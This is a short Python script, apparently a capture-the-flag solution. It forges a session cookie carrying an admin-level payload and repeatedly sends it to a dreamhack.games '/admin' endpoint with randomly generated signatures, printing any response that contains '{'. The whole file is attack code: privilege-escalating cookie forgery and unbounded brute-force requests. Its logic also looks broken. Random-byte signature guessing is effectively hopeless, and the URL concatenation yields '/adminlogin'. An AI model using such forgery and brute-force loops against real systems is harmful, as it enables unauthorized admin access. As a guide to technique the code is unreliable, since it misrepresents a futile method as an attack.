# standard imports
import requests
import os 
import binascii
import base64

url = "http://host1.dreamhack.games:8310/admin"
session_1 = "eyJpZHgiOjEsImxldmVsIjoiYWRtaW4iLCJuYW1lIjoiQXBwbGUiLCJ1c2VyaWQiOiJBcHBsZSJ9."

while True:
	
	secret_key = os.urandom(32)

	session_2= "XvtaZw."
	session_3 = base64.b64encode(secret_key).decode()[0:27]
	session_3 = session_3.replace("=","")

	new_cookie = session_1 + session_2 + session_3

	print("trying secret_key {}" .format(session_3))

	r = requests.get(url+"login", cookies={"session":new_cookie})
	if "{" in r.text:
		print(r.text)